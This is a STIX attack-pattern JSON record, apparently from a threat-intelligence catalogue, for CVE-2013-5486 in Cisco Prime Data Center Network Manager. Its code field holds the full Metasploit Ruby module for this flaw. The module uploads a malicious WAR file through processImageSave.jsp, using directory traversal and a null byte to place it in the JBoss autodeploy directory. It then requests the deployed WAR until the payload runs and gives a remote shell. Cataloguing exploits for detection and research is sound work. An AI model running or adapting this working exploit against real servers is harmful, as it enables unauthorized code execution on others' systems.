{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7cfa4ec7-2bcc-4755-9074-23858c473a8b",
    "created": "2024-08-14T17:07:34.394969Z",
    "modified": "2024-08-14T17:07:34.394974Z",
    "name": "Cisco Prime Data Center Network Manager Arbitrary File Upload",
    "description": " This module exploits a code execution flaw in Cisco Data Center Network Manager. The vulnerability exists in processImageSave.jsp, which can be abused through a directory traversal and a null byte injection to upload arbitrary files. The autodeploy JBoss application server feature is used to achieve remote code execution. This module has been tested successfully on Cisco Prime Data Center Network Manager 6.1(2) on Windows 2008 R2 (64 bits). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cisco_dcnm_upload.rb",
            "external_id": "cisco_dcnm_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5486"
        },
        {
            "source_name": "reference",
            "url": "http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130918-dcnm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Cisco Prime Data Center Network Manager Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits a code execution flaw in Cisco Data Center Network Manager. The\n        vulnerability exists in processImageSave.jsp, which can be abused through a directory\n        traversal and a null byte injection to upload arbitrary files. The autodeploy JBoss\n        application server feature is used to achieve remote code execution. This module has been\n        tested successfully on Cisco Prime Data Center Network Manager 6.1(2) on Windows 2008 R2\n        (64 bits).\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-5486'],\n          [ 'OSVDB', '97426' ],\n          [ 'ZDI', '13-254' ],\n          [ 'URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130918-dcnm' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'java',\n      'Arch'        => ARCH_JAVA,\n      'Targets'     =>\n        [\n          [ 'Cisco DCNM 6.1(2) / Java Universal',\n            {\n              'AutoDeployPath' => \"../../../../../deploy\",\n              'CleanupPath'    => \"../../jboss-4.2.2.GA/server/fm/deploy\"\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-09-18'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Path to Cisco DCNM', '/']),\n        OptInt.new('ATTEMPTS', [true, 'The number of attempts to execute the payload (auto deployed by JBoss)', 10])\n      ])\n  end\n\n  def upload_file(location, filename, contents)\n    res = send_request_cgi(\n      {\n        'uri'         => normalize_uri(target_uri.path, \"cues_utility\", \"charts\", \"processImageSave.jsp\"),\n        'method'      => 'POST',\n        'encode_params' => false,\n        'vars_post'   =>\n          {\n            \"mode\"     => \"save\",\n            \"savefile\" => \"true\",\n            \"chartid\"  => \"#{location}/#{filename}%00\",\n            \"data\"     => Rex::Text.uri_encode(Rex::Text.encode_base64(contents))\n          }\n      })\n\n    if res and res.code == 200 and res.body.to_s =~ /success/\n      return true\n    else\n      return false\n    end\n  end\n\n  def check\n    version = \"\"\n\n    res = send_request_cgi({\n      'url'    => target_uri.to_s,\n      'method' => 'GET'\n    })\n\n    unless res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.code == 200 and\n        res.body.to_s =~ /Data Center Network Manager/ and\n        res.body.to_s =~ /<div class=\"productVersion\">Version: (.*)<\\/div>/\n      version = $1\n      vprint_status(\"Cisco Primer Data Center Network Manager version #{version} found\")\n      if version =~ /6\\.1/\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Detected\n      end\n\n    elsif res.code == 200 and res.body.to_s =~ /Data Center Network Manager/\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    attempts = datastore['ATTEMPTS']\n    fail_with(Failure::BadConfig, \"#{peer} - Configure 1 or more ATTEMPTS\") unless attempts > 0\n\n    app_base = rand_text_alphanumeric(4+rand(32-4))\n\n    # By default uploads land here: C:\\Program Files\\Cisco Systems\\dcm\\jboss-4.2.2.GA\\server\\fm\\tmp\\deploy\\tmp3409372432509144123dcm-exp.war\\cues_utility\\charts\n    # Auto deploy dir is here C:\\Program Files\\Cisco Systems\\dcm\\jboss-4.2.2.GA\\server\\fm\\deploy\n    # Sessions pwd is here C:\\Program Files\\Cisco Systems\\dcm\\fm\\bin\n    war = payload.encoded_war({ :app_name => app_base }).to_s\n    war_filename = \"#{app_base}.war\"\n    war_location = target['AutoDeployPath']\n\n    print_status(\"Uploading WAR file #{war_filename}...\")\n    res = upload_file(war_location, war_filename, war)\n\n    if res\n      register_files_for_cleanup(\"#{target['CleanupPath']}/#{war_filename}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to upload the WAR payload\")\n    end\n\n\n    attempts.times do\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"Attempting to launch payload in deployed WAR...\")\n      res = send_request_cgi(\n        {\n          'uri'    => normalize_uri(target_uri.path, app_base, Rex::Text.rand_text_alpha(rand(8)+8)),\n          'method' => 'GET'\n        })\n      # Failure. The request timed out or the server went away.\n      fail_with(Failure::TimeoutExpired, \"#{peer} - The request timed out or the server went away.\") if res.nil?\n      # Success! Triggered the payload, should have a shell incoming\n      break if res.code == 200\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-18",
    "x_mitre_platforms": [
        "java'"
    ]
}